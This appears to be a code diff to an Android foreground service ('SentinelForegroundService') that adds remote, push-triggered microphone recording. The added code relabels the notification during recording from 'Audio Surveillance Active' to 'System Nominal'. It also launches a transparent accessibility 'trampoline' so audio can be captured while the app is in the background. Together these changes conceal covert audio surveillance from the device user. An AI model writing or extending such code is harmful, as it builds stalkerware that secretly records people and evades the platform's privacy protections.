@@ -203,45 +203,24 @@ class SentinelForegroundService : Service() {
             )
             wakeLock?.acquire(15_000L)
             connectionSupervisor.forceReconnect()
+
+            if (intent?.getBooleanExtra("EXTRA_START_AUDIO_STREAM", false) == true) {
+                Log.i(TAG, "FCM direct audio wake detected — engaging on-demand microphone capture")
+                startOnDemandAudio()
+            }
         }
 
         val notification = buildNotification("Scanning ...")
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             var started = false
-            // Baseline Idle mode: LOCATION | DATA_SYNC (Microphone unallocated, privacy dot OFF)
+            // Baseline Idle mode: LOCATION (Microphone unallocated, privacy dot OFF, no dataSync timeout)
             try {
-                var idleType = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                    idleType = idleType or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
-                }
-                startForeground(NOTIFICATION_ID, notification, idleType)
-                Log.i(TAG, "startForeground succeeded with LOCATION|DATA_SYNC (idle baseline)")
+                startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
+                Log.i(TAG, "startForeground succeeded with LOCATION (idle baseline)")
                 started = true
             } catch (e: Throwable) {
-                Log.w(TAG, "LOCATION|DATA_SYNC startForeground failed: ${e.message}")
-            }
-
-            // Fallback: LOCATION only
-            if (!started) {
-                try {
-                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
-                    Log.i(TAG, "startForeground succeeded with LOCATION only")
-                    started = true
-                } catch (e: Throwable) {
-                    Log.w(TAG, "LOCATION startForeground failed: ${e.message}")
-                }
-            }
-
-            // Fallback: DATA_SYNC only (Android 14+)
-            if (!started && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                try {
-                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
-                    Log.i(TAG, "startForeground succeeded with DATA_SYNC fallback")
-                    started = true
-                } catch (e: Throwable) {
-                    Log.w(TAG, "DATA_SYNC startForeground failed: ${e.message}")
-                }
+                Log.w(TAG, "LOCATION startForeground failed: ${e.message}")
             }
 
             // Safe catch-all fallback
@@ -292,7 +271,7 @@ class SentinelForegroundService : Service() {
                     is ConnectionState.Ready -> {
                         sendTelemetryReportNow()
                         startPeriodicTelemetry()
-                        if (isMicrophoneElevated) "Audio Surveillance Active" else "System Nominal"
+                        "System Nominal"
                     }
                     is ConnectionState.Reconnecting -> {
                         periodicTelemetryJob?.cancel()
@@ -403,14 +382,16 @@ class SentinelForegroundService : Service() {
         }
     }
 
+    private val audioTransitionLock = Any()
+
     /**
      * Dynamically elevates the foreground service to include MICROPHONE type
      * only during an active on-demand listening session.
      */
-    fun startOnDemandAudio() {
+    fun startOnDemandAudio() = synchronized(audioTransitionLock) {
         if (isMicrophoneElevated && audioStreamer.isStreaming) {
             Log.d(TAG, "Audio already streaming on-demand")
-            return
+            return@synchronized
         }
 
         val hasMic = ContextCompat.checkSelfPermission(
@@ -419,49 +400,48 @@ class SentinelForegroundService : Service() {
 
         if (!hasMic) {
             Log.w(TAG, "Cannot start on-demand audio: RECORD_AUDIO permission not granted")
-            return
+            return@synchronized
         }
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            var activeType = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
+            val activeType = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                     ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                activeType = activeType or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
-            }
             try {
-                val notification = buildNotification("Audio Surveillance Active")
+                val notification = buildNotification("System Nominal")
                 startForeground(NOTIFICATION_ID, notification, activeType)
                 isMicrophoneElevated = true
                 Log.i(TAG, "Dynamic FGS elevation to LOCATION|MICROPHONE succeeded — green privacy dot active")
             } catch (e: Throwable) {
                 Log.w(TAG, "Dynamic FGS elevation to MICROPHONE failed: ${e.message}")
             }
+        } else {
+            isMicrophoneElevated = true
         }
+
+        // Elevate process state to TOP via 1ms transparent trampoline for unmuted HAL capture
+        SentinelAccessibilityService.launchTrampoline(applicationContext)
 
         audioStreamer.hasPermission = true
         audioStreamer.start(maxDurationSeconds = 300L)
-        updateNotification("Audio Surveillance Active")
+        updateNotification("System Nominal")
     }
 
     /**
      * Stops on-demand audio capture, completely releases the AudioRecord hardware instance,
-     * and drops foreground service type back to LOCATION|DATA_SYNC so the Android green
+     * and drops foreground service type back to LOCATION so the Android green
      * microphone privacy dot turns OFF immediately.
      */
-    fun stopOnDemandAudio() {
+    fun stopOnDemandAudio() = synchronized(audioTransitionLock) {
         Log.i(TAG, "Stopping on-demand audio capture and releasing microphone resources")
         audioStreamer.stop()
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            var idleType = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                idleType = idleType or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
-            }
+            val idleType = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
             try {
                 val notification = buildNotification(if (connectionSupervisor.state.value is ConnectionState.Ready) "System Nominal" else "Syncing...")
                 startForeground(NOTIFICATION_ID, notification, idleType)
                 isMicrophoneElevated = false
-                Log.i(TAG, "Dropped FGS type back to LOCATION|DATA_SYNC — mic released, privacy dot OFF")
+                Log.i(TAG, "Dropped FGS type back to LOCATION — mic released, privacy dot OFF")
             } catch (e: Throwable) {
                 Log.w(TAG, "FGS drop back to idle type failed: ${e.message}")
             }
